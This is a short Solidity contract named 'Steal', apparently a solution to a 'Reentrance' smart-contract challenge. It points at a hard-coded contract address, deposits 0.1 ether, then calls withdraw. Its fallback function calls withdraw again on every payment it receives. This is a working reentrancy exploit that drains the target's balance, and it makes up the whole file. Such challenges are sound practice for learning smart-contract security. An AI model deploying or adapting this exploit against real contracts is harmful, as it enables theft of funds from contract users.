pragma solidity ^0.4.24;

import './reentrance.sol';

contract Steal {
    address target = 0x209b3fd79acbb6e4332d8c7e98df1df19b2b350a;
    Reentrance c;

    function Steal() {
       c = Reentrance(target);       
    }

    function attack() payable {
       c.donate.value(0.1 ether)(this);
       c.withdraw(0.1 ether);
    }

    function() payable {
        c.withdraw(0.1 ether);
    }
}